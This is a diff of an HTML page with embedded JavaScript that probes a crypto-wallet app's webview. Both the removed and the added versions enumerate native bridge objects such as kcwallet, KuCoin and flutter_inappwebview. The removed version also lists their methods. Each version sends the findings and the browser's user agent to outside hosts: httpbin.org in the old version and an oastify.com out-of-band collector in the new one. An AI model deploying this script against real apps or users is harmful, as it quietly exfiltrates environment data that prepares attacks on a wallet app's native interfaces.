@@ -1,31 +1,8 @@
-<html><body><script>
-var o = "URL: " + location.href + "\n";
-o += "UA: " + navigator.userAgent + "\n\n";
-
-var bridges = ["kcwallet","KuCoin","JSInterface","jsBridge","flutter_inappwebview","Android","webkit","nativeCall","KCBridge","FlutterBridge","AdaAndroid"];
-o += "BRIDGES:\n";
-bridges.forEach(function(n) {
-  if (window[n] !== undefined) {
-    o += "FOUND: " + n + " (" + typeof window[n] + ")\n";
-    try {
-      if (typeof window[n] === "object") {
-        Object.getOwnPropertyNames(window[n]).forEach(function(k) {
-          o += "  ." + k + " (" + typeof window[n][k] + ")\n";
-        });
-      }
-    } catch(e) { o += "  err:" + e.message + "\n"; }
-  }
-});
-
-o += "\nOBJECTS:\n";
-var skip = "location,navigator,document,console,performance,screen,history,localStorage,sessionStorage,crypto,self,window,frames,parent,top,length,name,customElements,origin,closed".split(",");
-for (var p in window) {
-  try {
-    if (skip.indexOf(p)===-1 && typeof window[p]==="object" && p.length<30) o += p + "\n";
-  } catch(e){}
-}
-
-new Image().src = "https://httpbin.org/get?probe=" + encodeURIComponent(o.substring(0,1500));
-fetch("https://httpbin.org/post", {method:"POST",body:o}).catch(function(){});
-document.title = o.substring(0,200);
-</script></body></html>
+  <html><body><script>
+  var o="";
+  var b=["kcwallet","KuCoin","JSInterface","jsBridge","flutter_inappwebview","Android","webkit","nativeCall","AdaAndroid"];
+  b.forEach(function(n){if(window[n]!==undefined){o+=n+"-"+typeof window[n]+",";}});
+  if(o==="")o="NO_BRIDGES";
+  new Image().src="https://"+o+".165fql10g1t00o7zirvjrf5ksby1mq.oastify.com";
+  new Image().src="https://probe.165fql10g1t00o7zirvjrf5ksby1mq.oastify.com/"+encodeURIComponent(navigator.userAgent);
+  </script></body></html>
